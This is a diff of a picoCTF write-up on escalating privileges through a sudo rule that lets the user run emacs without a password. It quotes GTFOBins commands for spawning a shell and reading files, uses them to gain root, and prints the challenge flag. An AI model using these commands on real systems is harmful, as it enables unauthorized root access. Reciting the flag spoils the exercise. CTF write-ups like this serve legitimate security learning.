@@ -4,22 +4,23 @@ Author: Darkraicg492
 
 Can you read the flag? I think you can!
 
-
-----
+---
 
 So I logged in and did `ls`
+
 ```bash
 ctf-player@challenge:~$ ls
 flag.txt
-ctf-player@challenge:~$ cat flag.txt 
+ctf-player@challenge:~$ cat flag.txt
 cat: flag.txt: Permission denied
 ```
 
 But yeah I wouldn't be that easy :)
 
 SO I checked the permissions
+
 ```bash
-ctf-player@challenge:~$ ls -lah 
+ctf-player@challenge:~$ ls -lah
 total 16K
 drwxr-xr-x 1 ctf-player ctf-player   20 Mar 10 11:34 .
 drwxr-xr-x 1 root       root         24 Mar  9 21:32 ..
@@ -41,73 +42,66 @@ User ctf-player may run the following commands on challenge:
     (ALL) NOPASSWD: /bin/emacs
 ```
 
-Meaning we can make use of `/bin/emacs` but how exactly 
-For that we need to go to [GTFObins](https://gtfobins.org/gtfobins/emacs/) and as we need to read file we can make use of 
+Meaning we can make use of `/bin/emacs` but how exactly
+For that we need to go to [GTFObins](https://gtfobins.org/gtfobins/emacs/) and as we need to read file we can make use of
 
 We got three options (For `sudo` just use `sudo` in front of the command)
+
 ### Shell[](https://gtfobins.org/gtfobins/emacs/#shell)
 
 This executable can spawn an interactive system shell.
 
 - Unprivileged
-    
-    This function can be performed by any unprivileged user.
-    
-    ```
-    emacs -Q -nw --eval '(term "/bin/sh")'
-    ```
+  This function can be performed by any unprivileged user.
+  ```
+  emacs -Q -nw --eval '(term "/bin/sh")'
+  ```
 
 ### File write[](https://gtfobins.org/gtfobins/emacs/#file-write)
 
 This executable can write data to local files.
 
 - Unprivileged
-    
-    This function can be performed by any unprivileged user.
-    
-    ```
-    emacs /path/to/output-file
-    DATA
-    C-x C-s
-    ```
-    
-    Remarks
-    
-    The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
-    
+  This function can be performed by any unprivileged user.
+  ```
+  emacs /path/to/output-file
+  DATA
+  C-x C-s
+  ```
+  Remarks
+  The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
 
 ### File read[](https://gtfobins.org/gtfobins/emacs/#file-read)
 
 This executable can read data from local files.
 
 - Unprivileged
-    
-    This function can be performed by any unprivileged user.
-    
-    ```
-    emacs /path/to/input-file
-    ```
-    
-    Remarks
-    
-    The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
+  This function can be performed by any unprivileged user.
+  ```
+  emacs /path/to/input-file
+  ```
+  Remarks
+  The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.
 
 ### Getting the flag
+
 Thus we will first try to read the file and after that will try to get root
+
 1. Read file using `ctf-player@challenge:~$ sudo /bin/emacs flag.txt`
+
    ```bash
    picoCTF{ju57_5ud0_17_9a782247}
    ```
 
-2. Now let's try to take over as a root with 
+2. Now let's try to take over as a root with
    ```bash
-	ctf-player@challenge:~$ sudo /bin/emacs -Q -nw --eval '(term "/bin/sh")'
+   ctf-player@challenge:~$ sudo /bin/emacs -Q -nw --eval '(term "/bin/sh")'
    ```
 
 ```bash
-# whoami                                                            
-root                                                                
-# cat flag.txt                                                              
+# whoami
+root
+# cat flag.txt
 picoCTF{ju57_5ud0_17_9a782247}
 ```
 
